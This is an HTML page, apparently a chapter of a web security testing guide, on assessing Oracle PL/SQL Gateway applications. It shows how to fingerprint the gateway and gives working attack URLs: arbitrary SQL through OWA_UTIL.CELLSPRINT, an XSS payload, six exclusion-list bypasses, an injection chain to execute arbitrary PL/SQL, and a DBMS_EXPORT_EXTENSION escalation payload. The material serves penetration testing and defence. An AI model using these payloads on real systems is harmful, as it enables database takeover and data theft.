@@ -1,0 +1,338 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Oracle SQLi</title>
+</head><body><b>Summary </b><br/>
+Web based PL/SQL applications are enabled by the PL/SQL Gateway, which is is the component that translates web requests into database queries. Oracle has developed a number of software implementations, ranging from the early web listener product to the Apache mod_plsql module to the XML Database (XDB) web server. All have their own quirks and issues, each of which will be thoroughly investigated in this chapter. Products that use the PL/SQL Gateway include, but are not limited to, the Oracle HTTP Server, eBusiness Suite, Portal, HTMLDB, WebDB and Oracle Application Server. <br/>
+<br/>
+<b>&nbsp;How to Test How the PL/SQL Gateway works </b><br/>
+Essentially the PL/SQL Gateway simply acts as a proxy server taking the user's web request and passes it on to the database server where it is executed. <br/>
+&nbsp;<ul><li>&nbsp;The web server accepts a request from a web client and determines if it should be processed by the PL/SQL Gateway.</li>
+<li>&nbsp;The PL/SQL Gateway processes the request by extracting the requested package name, procedure, and variables.</li>
+<li>&nbsp;The requested package and procedure are wrapped in a block of anonymous PL/SQL, and sent to the database server.</li>
+<li>&nbsp;The database server executes the procedure and sends the results back to the Gateway as HTML.</li>
+<li>&nbsp;The gateway sends the response, via the web server, back to the client.</li>
+</ul>
+<br/>
+<br/>
+Understanding this point is important - the PL/SQL code does not exist on the web server but, rather, in the database server. This means that any weaknesses in the PL/SQL Gateway or any weaknesses in the PL/SQL application, when exploited, give an attacker direct access to the database server; no amount of firewalls will prevent this. <br/>
+<br/>
+URLs for PL/SQL web applications are normally easily recognizable and generally start with the following (xyz can be any string and represents a Database Access Descriptor, which you will learn more about later): <br/>
+http://www.example.com/pls/xyz<br/>
+http://www.example.com/xyz/owa<br/>
+http://www.example.com/xyz/plsql<br/>
+<br/>
+While the second and third of these examples represent URLs from older versions of the PL/SQL Gateway, the first is from more recent versions running on Apache. In the plsql.conf Apache configuration file, /pls is the default, specified as a Location with the PLS module as the handler. The location need not be /pls, however. The absence of a file extension in a URL could indicate the presence of the Oracle PL/SQL Gateway. Consider the following URL:<br/>
+<br/>
+http://www.server.com/aaa/bbb/xxxxx.yyyyy<br/>
+<br/>
+If xxxxx.yyyyy were replaced with something along the lines of “ebank.home,” “store.welcome,” “auth.login,” or “books.search,” then there’s a fairly strong chance that the PL/SQL Gateway is being used. It is also possible to precede the requested package and procedure with the name of the user that owns it - i.e. the schema - in this case the user is "webuser":<br/>
+<br/>
+http://www.server.com/pls/xyz/webuser.pkg.proc<br/>
+<br/>
+In this URL, xyz is the Database Access Descriptor, or DAD. A DAD specifies information about the database server so that the PL/SQL Gateway can connect. It contains information such as the TNS connect string, the user ID and password, authentication methods, and so on. These DADs are specified in the dads.conf Apache configuration file in more recent versions or the wdbsvr.app file in older versions. Some default DADs include the following:<br/>
+<br/>
+SIMPLEDAD<br/>
+HTMLDB<br/>
+ORASSO<br/>
+SSODAD<br/>
+PORTAL<br/>
+PORTAL2<br/>
+PORTAL30<br/>
+PORTAL30_SSO<br/>
+TEST<br/>
+DAD<br/>
+APP<br/>
+ONLINE<br/>
+DB<br/>
+OWA<br/>
+<br/>
+<br/>
+<b>Determining if the PL/SQL Gateway is running</b><br/>
+When performing an assessment against a server, it's important first to know what technology you're actually dealing with. If you don't already know, for example, in a black box assessment scenario, then the first thing you need to do is work this out. Recognizing a web based PL/SQL application is pretty easy. First, there is the format of the URL and what it looks like, discussed above. Beyond that there are a set of simple tests that can be performed to test for the existence of the PL/SQL Gateway.<br/>
+<br/>
+<br/>
+<b>Server response headers</b><br/>
+The web server's response headers are a good indicator as to whether the server is running the PL/SQL Gateway. The table below lists some of the typical server response headers:<br/>
+<br/>
+Oracle-Application-Server-10g<br/>
+Oracle-Application-Server-10g/10.1.2.0.0 Oracle-HTTP-Server<br/>
+Oracle-Application-Server-10g/9.0.4.1.0 Oracle-HTTP-Server<br/>
+Oracle-Application-Server-10g OracleAS-Web-Cache-10g/9.0.4.2.0 (N)<br/>
+Oracle-Application-Server-10g/9.0.4.0.0<br/>
+Oracle HTTP Server Powered by Apache<br/>
+Oracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3a<br/>
+Oracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3d<br/>
+Oracle HTTP Server Powered by Apache/1.3.12 (Unix) mod_plsql/3.0.9.8.5e<br/>
+Oracle HTTP Server Powered by Apache/1.3.12 (Win32) mod_plsql/3.0.9.8.5e<br/>
+Oracle HTTP Server Powered by Apache/1.3.19 (Win32) mod_plsql/3.0.9.8.3c<br/>
+Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/3.0.9.8.3b <br/>
+Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/9.0.2.0.0 <br/>
+Oracle_Web_Listener/4.0.7.1.0EnterpriseEdition<br/>
+Oracle_Web_Listener/4.0.8.2EnterpriseEdition<br/>
+Oracle_Web_Listener/4.0.8.1.0EnterpriseEdition<br/>
+Oracle_Web_listener3.0.2.0.0/2.14FC1<br/>
+Oracle9iAS/9.0.2 Oracle HTTP Server<br/>
+Oracle9iAS/9.0.3.1 Oracle HTTP Server<br/>
+<br/>
+<br/>
+<b>The NULL test</b><br/>
+In PL/SQL, "null" is a perfectly acceptable expression:<br/>
+<br/>
+SQL&gt; BEGIN<br/>
+&nbsp;2 &nbsp;NULL;<br/>
+&nbsp;3 &nbsp;END;<br/>
+&nbsp;4 &nbsp;/<br/>
+<br/>
+PL/SQL procedure successfully completed.<br/>
+<br/>
+<br/>
+We can use this to test if the server is running the PL/SQL Gateway. Simply take the DAD and append NULL, then append NOSUCHPROC:<br/>
+<br/>
+http://www.example.com/pls/dad/null<br/>
+http://www.example.com/pls/dad/nosuchproc<br/>
+<br/>
+<br/>
+If the server responds with a 200 OK response for the first and a 404 Not Found for the second then it indicates that the server is running the PL/SQL Gateway.<br/>
+<br/>
+<br/>
+<b>Known package access</b><br/>
+On older versions of the PL/SQL Gateway, it is possible to directly access the packages that form the PL/SQL Web Toolkit such as the OWA and HTP packages. One of these packages is the OWA_UTIL package, which we'll speak about more later on. This package contains a procedure called SIGNATURE and it simply outputs in HTML a PL/SQL signature. Thus requesting<br/>
+<br/>
+http://www.example.com/pls/dad/owa_util.signature<br/>
+<br/>
+returns the following output on the webpage<br/>
+<br/>
+"This page was produced by the PL/SQL Web Toolkit on date"<br/>
+<br/>
+or<br/>
+<br/>
+"This page was produced by the PL/SQL Cartridge on date"<br/>
+<br/>
+<br/>
+If you don't get this response but a 403 Forbidden response then you can infer that the PL/SQL Gateway is running. This is the response you should get in later versions or patched systems.<br/>
+<br/>
+<br/>
+<b>Accessing Arbitrary PL/SQL Packages in the Database</b><br/>
+It is possible to exploit vulnerabilities in the PL/SQL packages that are installed by default in the database server. How you do this depends on the version of the PL/SQL Gateway. In earlier versions of the PL/SQL Gateway, there was nothing to stop an attacker from accessing an arbitrary PL/SQL package in the database server. We mentioned the OWA_UTIL package earlier. This can be used to run arbitrary SQL queries:<br/>
+http://www.example.com/pls/dad/OWA_UTIL.CELLSPRINT? P_THEQUERY=SELECT+USERNAME+FROM+ALL_USERS<br/>
+<br/>
+Cross Site Scripting attacks could be launched via the HTP package:<br/>
+http://www.example.com/pls/dad/HTP.PRINT?CBUF=&lt;script&gt;alert('XSS')&lt;/script&gt;<br/>
+<br/>
+Clearly, this is dangerous, so Oracle introduced a PLSQL Exclusion list to prevent direct access to such dangerous procedures. Banned items include any request starting with SYS.*, any request starting with DBMS_*, any request with HTP.* or OWA*. It is possible to bypass the exclusion list however. What's more, the exclusion list does not prevent access to packages in the CTXSYS and MDSYS schemas or others, so it is possible to exploit flaws in these packages:<br/>
+<br/>
+http://www.example.com/pls/dad/CXTSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL<br/>
+<br/>
+This will return a blank HTML page with a 200 OK response if the database server is still vulnerable to this flaw (CVE-2006-0265)<br/>
+<br/>
+<br/>
+<b>Testing the PL/SQL Gateway For Flaws</b><br/>
+Over the years, the Oracle PL/SQL Gateway has suffered from a number of flaws, including access to admin pages (CVE-2002-0561), buffer overflows (CVE-2002-0559), directory traversal bugs, and vulnerabilities that allow attackers to bypass the Exclusion List and go on to access and execute arbitrary PL/SQL packages in the database server.<br/>
+<br/>
+<br/>
+<b>Bypassing the PL/SQL Exclusion List</b><br/>
+It is incredible how many times Oracle has attempted to fix flaws that allow attackers to bypass the exclusion list. Each patch that Oracle has produced has fallen victim to a new bypass technique. The history of this sorry story can be found here: http://seclists.org/fulldisclosure/2006/Feb/0011.html<br/>
+<br/>
+<br/>
+<b>Bypassing the Exclusion List - Method 1</b><br/>
+When Oracle first introduced the PL/SQL Exclusion List to prevent attackers from accessing arbitrary PL/SQL packages, it could be trivially bypassed by preceding the name of the schema/package with a hex encoded newline character or space or tab:<br/>
+<br/>
+http://www.example.com/pls/dad/%0ASYS.PACKAGE.PROC<br/>
+http://www.example.com/pls/dad/%20SYS.PACKAGE.PROC<br/>
+http://www.example.com/pls/dad/%09SYS.PACKAGE.PROC<br/>
+<br/>
+<br/>
+<b>Bypassing the Exclusion List - Method 2</b><br/>
+Later versions of the Gateway allowed attackers to bypass the exclusion list by preceding the name of the schema/package with a label. In PL/SQL a label points to a line of code that can be jumped to using the GOTO statement and takes the following form: &lt;&lt;NAME&gt;&gt;<br/>
+<br/>
+http://www.example.com/pls/dad/&lt;&lt;LBL&gt;&gt;SYS.PACKAGE.PROC<br/>
+<br/>
+<br/>
+<b>Bypassing the Exclusion List - Method 3</b><br/>
+Simply placing the name of the schema/package in double quotes could allow an attacker to bypass the exclusion list. Note that this will not work on Oracle Application Server 10g as it converts the user's request to lowercase before sending it to the database server and a quote literal is case sensitive - thus "SYS" and "sys" are not the same and requests for the latter will result in a 404 Not Found. On earlier versions though the following can bypass the exclusion list:<br/>
+<br/>
+http://www.example.com/pls/dad/"SYS".PACKAGE.PROC<br/>
+<br/>
+<br/>
+<b>Bypassing the Exclusion List - Method 4</b><br/>
+Depending upon the character set in use on the web server and on the database server, some characters are translated. Thus, depending upon the character sets in use, the "ÿ" character (0xFF) might be converted to a "Y" at the database server. Another character that is often converted to an upper case "Y" is the Macron character - 0xAF. This may allow an attacker to bypass the exclusion list:<br/>
+<br/>
+http://www.example.com/pls/dad/S%FFS.PACKAGE.PROC<br/>
+http://www.example.com/pls/dad/S%AFS.PACKAGE.PROC<br/>
+<br/>
+<br/>
+<b>Bypassing the Exclusion List - Method 5</b><br/>
+Some versions of the PL/SQL Gateway allow the exclusion list to be bypassed with a backslash - 0x5C:<br/>
+<br/>
+http://www.example.com/pls/dad/%5CSYS.PACKAGE.PROC<br/>
+<br/>
+<br/>
+<b>Bypassing the Exclusion List - Method 6</b><br/>
+This is the most complex method of bypassing the exclusion list and is the most recently patched method. If we were to request the following<br/>
+<br/>
+http://www.example.com/pls/dad/foo.bar?xyz=123<br/>
+<br/>
+the application server would execute the following at the database server:<br/>
+1 declare<br/>
+2 &nbsp;rc__ number;<br/>
+3 &nbsp;start_time__ binary_integer;<br/>
+4 &nbsp;simple_list__ owa_util.vc_arr;<br/>
+5 &nbsp;complex_list__ owa_util.vc_arr;<br/>
+6 begin<br/>
+7 &nbsp;start_time__ := dbms_utility.get_time;<br/>
+8 &nbsp;owa.init_cgi_env(:n__,:nm__,:v__);<br/>
+9 &nbsp;htp.HTBUF_LEN := 255;<br/>
+10 &nbsp;null;<br/>
+11 &nbsp;null;<br/>
+12 &nbsp;simple_list__(1) := 'sys.%';<br/>
+13 &nbsp;simple_list__(2) := 'dbms\_%';<br/>
+14 &nbsp;simple_list__(3) := 'utl\_%';<br/>
+15 &nbsp;simple_list__(4) := 'owa\_%';<br/>
+16 &nbsp;simple_list__(5) := 'owa.%';<br/>
+17 &nbsp;simple_list__(6) := 'htp.%';<br/>
+18 &nbsp;simple_list__(7) := 'htf.%';<br/>
+19 &nbsp;if ((owa_match.match_pattern('foo.bar', simple_list__, complex_list__, true))) then<br/>
+20 &nbsp; rc__ := 2;<br/>
+21 &nbsp;else<br/>
+22 &nbsp; null;<br/>
+23 &nbsp; orasso.wpg_session.init();<br/>
+24 &nbsp; foo.bar(XYZ=&gt;:XYZ);<br/>
+25 &nbsp; if (wpg_docload.is_file_download) then<br/>
+26 &nbsp; &nbsp;rc__ := 1;<br/>
+27 &nbsp; &nbsp;wpg_docload.get_download_file(:doc_info);<br/>
+28 &nbsp; &nbsp;orasso.wpg_session.deinit();<br/>
+29 &nbsp; &nbsp;null;<br/>
+30 &nbsp; &nbsp;null;<br/>
+31 &nbsp; &nbsp;commit;<br/>
+32 &nbsp; else<br/>
+33 &nbsp; &nbsp;rc__ := 0;<br/>
+34 &nbsp; &nbsp;orasso.wpg_session.deinit();<br/>
+35 &nbsp; &nbsp;null;<br/>
+36 &nbsp; &nbsp;null;<br/>
+37 &nbsp; &nbsp;commit;<br/>
+38 &nbsp; &nbsp;owa.get_page(:data__,:ndata__);<br/>
+39 &nbsp; end if;<br/>
+40 &nbsp;end if;<br/>
+41 &nbsp;:rc__ := rc__;<br/>
+42 &nbsp;:db_proc_time__ := dbms_utility.get_time—start_time__;<br/>
+43 end;<br/>
+<br/>
+<br/>
+Notice lines 19 and 24. On line 19, the user’s request is checked against a list of known “bad” strings, i.e., the exclusion list. If the requested package and procedure do not contain bad strings, then the procedure is executed on line 24. The XYZ parameter is passed as a bind variable.<br/>
+<br/>
+<br/>
+If we then request the following:<br/>
+http://server.example.com/pls/dad/INJECT'POINT <br/>
+<br/>
+the following PL/SQL is executed:<br/>
+..<br/>
+18 &nbsp;simple_list__(7) := 'htf.%';<br/>
+19 &nbsp;if ((owa_match.match_pattern('inject'point', simple_list__, complex_list__, true))) then<br/>
+20 &nbsp; rc__ := 2;<br/>
+21 &nbsp;else<br/>
+22 &nbsp; null;<br/>
+23 &nbsp; orasso.wpg_session.init();<br/>
+24 &nbsp; inject'point;<br/>
+..<br/>
+<br/>
+<br/>
+This generates an error in the error log: “PLS-00103: Encountered the symbol ‘POINT’ when expecting one of the following. . .” What we have here is a way to inject arbitrary SQL. This can be exploited to bypass the exclusion list. First, the attacker needs to find a PL/SQL procedure that takes no parameters and doesn't match anything in the exclusion list. There are a good number of default packages that match this criteria, for example:<br/>
+<br/>
+JAVA_AUTONOMOUS_TRANSACTION.PUSH<br/>
+XMLGEN.USELOWERCASETAGNAMES<br/>
+PORTAL.WWV_HTP.CENTERCLOSE<br/>
+ORASSO.HOME<br/>
+WWC_VERSION.GET_HTTP_DATABASE_INFO<br/>
+<br/>
+<br/>
+An attacker should pick one of these functions that is actually available on the target system (i.e., returns a 200 OK when requested). As a test, an attacker can request<br/>
+http://server.example.com/pls/dad/orasso.home?FOO=BAR<br/>
+<br/>
+<br/>
+the server should return a “404 File Not Found” response because the orasso.home procedure does not require parameters and one has been supplied. However, before the 404 is returned, the following PL/SQL is executed:<br/>
+<br/>
+..<br/>
+..<br/>
+if ((owa_match.match_pattern('orasso.home', simple_list__, complex_list__, true))) then<br/>
+&nbsp;rc__ := 2;<br/>
+else<br/>
+&nbsp; &nbsp;null;<br/>
+&nbsp; &nbsp;orasso.wpg_session.init();<br/>
+&nbsp; &nbsp;orasso.home(FOO=&gt;:FOO);<br/>
+&nbsp; &nbsp;..<br/>
+&nbsp; &nbsp;..<br/>
+<br/>
+<br/>
+Note the presence of FOO in the attacker’s query string. Attackers can abuse this to run arbitrary SQL. First, they need to close the brackets:<br/>
+http://server.example.com/pls/dad/orasso.home?);--=BAR<br/>
+<br/>
+<br/>
+This results in the following PL/SQL being executed:<br/>
+..<br/>
+orasso.home();--=&gt;:);--);<br/>
+..<br/>
+<br/>
+<br/>
+Note that everything after the double minus (--) is treated as a comment. This request will cause an internal server error because one of the bind variables is no longer used, so the attacker needs to add it back. As it happens, it’s this bind variable that is the key to running arbitrary PL/SQL. For the moment, they can just use HTP.PRINT to print BAR, and add the needed bind variable as :1:<br/>
+http://server.example.com/pls/dad/orasso.home?);HTP.PRINT(:1);--=BAR<br/>
+<br/>
+<br/>
+This should return a 200 with the word “BAR” in the HTML. What’s happening here is that everything after the equals sign - BAR in this case - is the data inserted into the bind variable. Using the same technique it’s possible to also gain access to owa_util.cellsprint again:<br/>
+<br/>
+http://www.example.com/pls/dad/orasso.home?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS<br/>
+<br/>
+<br/>
+To execute arbitrary SQL, including DML and DDL statements, the attacker inserts an execute immediate :1:<br/>
+http://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1;--=select%201%20from%20dual<br/>
+<br/>
+<br/>
+Note that the output won’t be displayed. This can be leveraged to exploit any PL/SQL injection bugs owned by SYS, thus enabling an attacker to gain complete control of the backend database server. For example, the following URL takes advantage of the SQL injection flaws in DBMS_EXPORT_EXTENSION (see http://secunia.com/advisories/19860)<br/>
+<br/>
+http://www.example.com/pls/dad/orasso.home?);<br/>
+&nbsp;execute%20immediate%20:1;--=DECLARE%20BUF%20VARCHAR2(2000);%20BEGIN%20<br/>
+&nbsp;BUF:=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES<br/>
+&nbsp;('INDEX_NAME','INDEX_SCHEMA','DBMS_OUTPUT.PUT_LINE(:p1);<br/>
+&nbsp;EXECUTE%20IMMEDIATE%20''CREATE%20OR%20REPLACE%20<br/>
+&nbsp;PUBLIC%20SYNONYM%20BREAKABLE%20FOR%20SYS.OWA_UTIL'';<br/>
+&nbsp;END;--','SYS',1,'VER',0);END;<br/>
+<br/>
+<br/>
+<b>Assessing Custom PL/SQL Web Applications</b><br/>
+<br/>
+During black box security assessments, the code of the custom PL/SQL application is not available, but it still needs to be assessed for security vulnerabilities.<br/>
+<br/>
+<br/>
+<b>Testing for SQL Injection</b><br/>
+Each input parameter should be tested for SQL injection flaws. These are easy to find and confirm. Finding them is as easy as embedding a single quote into the parameter and checking for error responses (which include 404 Not Found errors). Confirming the presence of SQL injection can be performed using the concatenation operator.<br/>
+<br/>
+<br/>
+For example, assume there is a bookstore PL/SQL web application that allows users to search for books by a given author:<br/>
+http://www.example.com/pls/bookstore/books.search?author=DICKENS<br/>
+<br/>
+<br/>
+If this request returns books by Charles Dickens, but<br/>
+http://www.example.com/pls/bookstore/books.search?author=DICK'ENS<br/>
+<br/>
+<br/>
+returns an error or a 404, then there might be a SQL injection flaw. This can be confirmed by using the concatenation operator:<br/>
+http://www.example.com/pls/bookstore/books.search?author=DICK'||'ENS<br/>
+<br/>
+<br/>
+If this request returns books by Charles Dickens, you've confirmed the presence of the SQL injection vulnerability.<br/>
+<br/>
+<br/>
+Tools <ul><li>&nbsp;SQLInjector - <a href="http://www.databasesecurity.com/sql-injector.htm">http://www.databasesecurity.com/sql-injector.htm</a></li>
+<li>&nbsp;Orascan (Oracle Web Application VA scanner), NGS SQuirreL (Oracle RDBMS VA Scanner) - <a href="http://www.nccgroup.com/en/our-services/security-testing-audit-compliance/information-security-software/ngs-orascan/">http://www.nccgroup.com/en/our-services/security-testing-audit-compliance/information-security-software/ngs-orascan/</a></li>
+</ul>
+<br/>
+<br/>
+<br/>
+&nbsp;References <br/>
+<b>Whitepapers</b><br/>
+<br/>
+&nbsp;<ul><li>&nbsp;Hackproofing Oracle Application Server (A Guide to Securing Oracle 9) - <a href="http://www.itsec.gov.cn/docs/20090507151158287612.pdf">http://www.itsec.gov.cn/docs/20090507151158287612.pdf</a></li>
+<li>&nbsp;Oracle PL/SQL Injection - <a href="http://www.databasesecurity.com/oracle/oracle-plsql-2.pdf">http://www.databasesecurity.com/oracle/oracle-plsql-2.pdf</a></li>
+</ul>
+&nbsp;</body></html>
